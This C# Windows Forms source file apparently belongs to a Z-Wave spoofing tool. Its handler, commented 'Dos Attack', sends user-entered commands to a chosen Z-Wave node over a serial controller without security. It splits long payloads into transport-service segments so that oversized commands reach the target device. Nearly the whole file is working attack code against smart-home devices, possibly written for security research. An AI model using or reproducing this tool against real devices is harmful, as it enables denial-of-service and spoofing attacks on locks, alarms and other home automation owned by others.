using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using ZWaveLib;
using ZWaveLib.CommandClasses;
using System.Text.RegularExpressions;

namespace WYP_ZWave_Spoofing_Tool
{
    public partial class Form1 : Form
    {
        public static string serialPortName = "COM3";
        ZWaveController controller = new ZWaveController(serialPortName);

        public static string dump_command = null;
        public static string dump_DST_nodeid = null;
        public static byte[] First_Segment = new byte[2] { 0x55, 0xC0 };
        public static byte[] Subsequent_Segment = new byte[2] { 0x55, 0xE0 };
        public static byte[] Segment_Complete = new byte[2] { 0x55, 0xE8 };

        public Form1(ZWaveController new_controller)
        {
            controller = new_controller;
            InitializeComponent();
        }

        //Dos Attack
        private void btn4_Click(object sender, EventArgs e)
        {
            dump_DST_nodeid = textBox2.Text;
            dump_DST_nodeid = Regex.Replace(dump_DST_nodeid, " ", "");
            char[] buf = dump_DST_nodeid.ToCharArray();
            byte[] real_dst = new byte[1];
            StringToHex.String_to_Hex(buf, real_dst, buf.Length);

            dump_command = textBox1.Text;
            dump_command = Regex.Replace(dump_command, " ", "");
            char[] buf1 = dump_command.ToCharArray();
            byte[] real_command = new byte[buf1.Length / 2];
            StringToHex.String_to_Hex_For_Dos(buf1, real_command, buf1.Length);

            dump_DST_nodeid = null;
            dump_command = null;

            if(real_command.Length < 40)
            {
                Send_command.RunCommand_Nonsecurity(controller, real_dst, real_command);
            }
            else
            {
                byte[] segment_complete = new byte[2];
                byte[] Seg_Command = new byte[42];
                int cnt = 0;
                int len = real_command.Length;

                do
                {
                    if(cnt == 0) // first packet
                    {
                        Seg_Command[0] = First_Segment[0];
                        Seg_Command[1] = First_Segment[1];
                        // len = len - 40
                        for(int i = 0; i < 40; i++)
                        {
                            Seg_Command[i + 2] = real_command[i];
                        }
                        len = len - 40;
                        Send_command.RunCommand_Nonsecurity(controller, real_dst, Seg_Command);
                        Array.Clear(Seg_Command, 0, Seg_Command.Length);
                    }
                    else // subsequent packet
                    {
                        Seg_Command[0] = Subsequent_Segment[0];
                        Seg_Command[1] = Subsequent_Segment[1];
                        
                        // 1) len >= 40 
                        // 2) len < 40
                        if(len >= 40)
                        {
                            for (int i = 0; i < 40; i++)
                            {
                                Seg_Command[i + 2] = real_command[i + (cnt * 40)];
                            }
                            len = len - 40;
                            Send_command.RunCommand_Nonsecurity(controller, real_dst, Seg_Command);
                            Array.Clear(Seg_Command, 0, Seg_Command.Length);
                        }
                        else
                        {
                            byte[] Seg_Command2 = new byte[len + 2];
                            Seg_Command2[0] = Subsequent_Segment[0];
                            Seg_Command2[1] = Subsequent_Segment[1];
                            for (int i = 0; i < len; i++)
                            {
                                Seg_Command2[i + 2] = real_command[i + (cnt * 40)];
                            }
                            len = 0;
                            Send_command.RunCommand_Nonsecurity(controller, real_dst, Seg_Command2);
                            Array.Clear(Seg_Command2, 0, Seg_Command2.Length);
                        }
                    }
                    cnt++;
                } while (len != 0);
                segment_complete[0] = Segment_Complete[0];
                segment_complete[1] = Segment_Complete[1];
                Send_command.RunCommand_Nonsecurity(controller, real_dst, segment_complete);
                cnt = 0;
            }
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
    }
}
